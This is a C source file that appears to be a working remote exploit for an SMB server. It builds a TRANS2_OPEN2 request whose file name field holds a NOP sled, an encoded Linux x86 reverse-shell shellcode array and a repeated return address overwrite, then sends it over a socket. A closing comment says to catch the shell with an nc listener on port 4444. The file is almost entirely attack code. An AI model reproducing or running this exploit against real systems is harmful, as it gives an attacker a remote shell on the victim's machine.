#include <arpa/inet.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>

#include "../../lib/nbios/nbios.h"
#include "../../lib/smb/smb.h"

#include "./module_ptr.h"

#pragma pack(push, p1, 1)

struct params_t {
  uint16_t total_parameter_count;
  uint16_t total_data_count;
  uint16_t max_parameter_count;
  uint16_t max_data_count;
  uint8_t max_setup_count;
  uint8_t pad;
  uint16_t flags;
  uint32_t timeout;
  uint16_t reserved;
  uint16_t parameter_count;
  uint16_t parameter_offset;
  uint16_t data_count;
  uint16_t data_offset;
  uint8_t setup_count;
  uint8_t pad2;
  uint16_t setup_word;
};

struct open2_t {
  uint16_t flags;
  uint16_t access_mode;
  uint16_t reserved;
  uint16_t file_attr;
  uint32_t creation_time;
  uint16_t open_mode;
  uint32_t allocation_size;
  uint8_t reserved2[10];
  uint8_t file_name[3000];
};

struct data_bytes_t {
  uint8_t name;
  uint8_t pad[2];
  struct open2_t open2;
  uint8_t pad2[4];
  uint8_t trans2_data_bytes;
};

struct packet_t {
  struct nbios_header nb_hdr;
  struct smb_header smb_hdr;
  uint8_t word_count;
  struct params_t params;
  uint16_t byte_count;
  struct data_bytes_t data_bytes;
};

uint8_t linux_x86_revshell[] =
    "\x89\xe6\xda\xc4\xd9\x76\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a"
    "\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59"
    "\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41"
    "\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42"
    "\x75\x4a\x49\x46\x51\x39\x4b\x38\x77\x6d\x33\x73\x63\x70"
    "\x43\x32\x73\x43\x5a\x54\x42\x6e\x69\x6d\x31\x4c\x70\x70"
    "\x66\x48\x4d\x4b\x30\x6d\x43\x66\x39\x38\x30\x77\x4f\x58"
    "\x4d\x4f\x70\x62\x69\x64\x39\x7a\x59\x63\x58\x69\x50\x6c"
    "\x68\x76\x61\x44\x46\x50\x68\x65\x52\x77\x70\x52\x31\x71"
    "\x4c\x6d\x59\x4b\x51\x58\x30\x65\x36\x36\x30\x63\x61\x53"
    "\x63\x6c\x73\x56\x63\x6d\x59\x6b\x51\x58\x4d\x4f\x70\x70"
    "\x52\x61\x78\x62\x4e\x36\x4f\x63\x43\x32\x48\x31\x78\x46"
    "\x4f\x76\x4f\x52\x42\x73\x59\x4c\x49\x69\x73\x43\x62\x61"
    "\x43\x6b\x39\x59\x71\x48\x30\x64\x4b\x58\x4d\x4d\x50\x41"
    "\x41";

#pragma pack(pop, p1)

int smb_com_trans2_open2(int sock, uint16_t tid, uint16_t uid, uint32_t eip) {
  struct packet_t packet;
  memset(&packet, 0, sizeof(struct packet_t));

  // nb header
  packet.nb_hdr.nb_length = htons(sizeof(struct packet_t) - 4);

  // smb header
  memcpy(packet.smb_hdr.protocol, "\xffSMB", 4);
  packet.smb_hdr.command = 0x32;
  packet.smb_hdr.flag = 0x08;
  packet.smb_hdr.flag2 = 0x0001;
  packet.smb_hdr.tid = tid;
  packet.smb_hdr.uid = uid;

  packet.word_count = 0x0f;

  // params
  packet.params.total_parameter_count = htole16(3030);
  packet.params.parameter_count = htole16(3030);
  packet.params.parameter_offset =
      htole16((uint8_t *)&packet.data_bytes.open2 - (uint8_t *)&packet.smb_hdr);
  packet.params.data_offset =
      htole16((uint8_t *)&packet.data_bytes.open2.file_name[12] -
              (uint8_t *)&packet.smb_hdr);

  // data bytes
  packet.byte_count = htole16(sizeof(struct data_bytes_t));
  packet.data_bytes.open2.access_mode = htole16(0x0002);
  packet.data_bytes.open2.open_mode = htole16(0x0010);

  memset(packet.data_bytes.open2.file_name, 0x90, 3000);
  memcpy(packet.data_bytes.open2.file_name + 800, linux_x86_revshell, 198);

  for (int i = 0; i < 494 * 4; i += 4) {
    memcpy(packet.data_bytes.open2.file_name + 1024 + i, (uint8_t *)&eip, 4);
  };

  if (send(sock, &packet, sizeof(struct packet_t), 0) < 0) {
    printf("sending failed\n");
    return -1;
  };

  return 0;

  // We can't check that exploration was successful in code
  // But we can use nc -lvp 4444
};
